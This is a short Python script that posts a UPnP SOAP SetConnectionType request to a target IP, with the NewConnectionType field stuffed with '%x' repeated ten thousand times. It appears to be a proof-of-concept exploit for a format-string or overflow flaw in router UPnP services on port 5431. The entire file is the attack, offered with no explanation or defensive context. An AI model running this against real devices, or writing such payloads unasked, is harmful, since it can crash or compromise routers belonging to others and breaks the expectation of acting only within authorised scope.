import requests
import argparse

def send_set_connection_type(ip, port):
    url = f"http://{ip}:{port}/control/WANIPConnection"

    headers = {
        "Content-Type": "text/xml",
        "SOAPAction": "urn:schemas-upnp-org:service:WANIPConnection:1#SetConnectionType"
    }

    hex_string = "%x" * 10000

    data = f'''<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <u:SetConnectionType xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
      <NewConnectionType>{hex_string}</NewConnectionType>
    </u:SetConnectionType>
  </s:Body>
</s:Envelope>'''

    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        print(f"Status Code: {response.status_code}")
        print("Response Body:")
        print(response.text)
    except requests.RequestException as e:
        print(f"[!] Request failed: {e}")

def main():
    parser = argparse.ArgumentParser(description="Send SOAP SetConnectionType request to target IP")
    parser.add_argument("ip", help="Target IP address (e.g., 192.168.1.1)")
    parser.add_argument("-p", "--port", type=int, default=5431, help="Target port (default: 5431)")
    args = parser.parse_args()

    send_set_connection_type(args.ip, args.port)

if __name__ == "__main__":
    main()
